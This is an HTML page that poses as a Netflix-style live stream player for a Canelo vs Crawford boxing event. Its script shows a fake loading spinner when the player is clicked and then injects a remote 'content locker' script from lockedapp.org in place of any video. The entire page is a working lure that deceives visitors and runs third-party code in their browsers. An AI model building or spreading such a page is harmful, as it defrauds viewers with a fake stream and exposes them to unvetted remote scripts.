<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="8URkvLNbO9Qx2daMQPAMMiL0zxalj7EK7pZQfVVcJhs" />
    <title>Live Stream - Now Playing</title>
    <style>
        /* --- Basic Setup & Netflix Style --- */
        body {
            margin: 0;
            background-color: #141414; /* Netflix dark background */
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }

        /* --- Main Player Container --- */
        .player-container {
            position: relative;
            width: 90%;
            max-width: 1000px;
            aspect-ratio: 16 / 9; /* Standard widescreen ratio */
            background-color: #000000;
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            cursor: pointer;
            overflow: hidden;
            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.5);
        }

        .player-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 25%);
            z-index: 1;
        }

        /* --- Play Button --- */
        #playButton {
            width: 90px;
            height: 90px;
            background-color: rgba(0, 0, 0, 0.5);
            border: 3px solid white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2;
            transition: transform 0.2s ease, background-color 0.2s ease;
        }

        #playButton:hover {
            transform: scale(1.1);
            background-color: rgba(229, 9, 20, 0.8); /* Netflix Red on hover */
        }

        /* The triangle part of the play button */
        #playButton svg {
            width: 40px;
            height: 40px;
            fill: white;
            margin-left: 5px; /* Optical alignment */
        }

        /* --- Stream Title --- */
        .stream-title {
            position: absolute;
            bottom: 30px;
            left: 30px;
            z-index: 2;
            font-size: 2.5vw; /* Responsive font size */
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
        }

        /* --- Loading Spinner --- */
        #loader {
            display: none; /* Hidden by default */
            border: 8px solid #f3f3f3;
            border-top: 8px solid #e50914; /* Netflix Red */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            z-index: 3;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>

    <div class="player-container" id="player">
        <div class="player-overlay"></div>
        <div class="stream-title">
            LIVE EVENT: Canelo vs Crawford
        </div>
        <div id="playButton">
            <svg viewBox="0 0 24 24">
                <path d="M8 5v14l11-7z"></path>
            </svg>
        </div>
        <div id="loader"></div>
    </div>

    <script type="text/javascript">
        // Get elements from the page
        const playerContainer = document.getElementById('player');
        const playButton = document.getElementById('playButton');
        const loader = document.getElementById('loader');

        // Add a click event listener to the whole player
        playerContainer.addEventListener('click', function() {
            // Hide the play button and title
            playButton.style.display = 'none';
            document.querySelector('.stream-title').style.display = 'none';

            // Show the loading spinner
            loader.style.display = 'block';

            // Wait for 2.5 seconds to simulate loading, then trigger the locker
            setTimeout(function() {
                // Hide the loader
                loader.style.display = 'none';
                
                // Trigger the content locker
                triggerContentLocker();

            }, 2500); // 2500 milliseconds = 2.5 seconds
        });

        function triggerContentLocker() {
            const lockerScript = document.createElement('script');
            lockerScript.type = 'text/javascript';
            lockerScript.id = 'ogjs';
            lockerScript.src = 'https://lockedapp.org/cl/js/99ogpv'; // Your script
            document.body.appendChild(lockerScript);
        }
    </script>

</body>
</html>
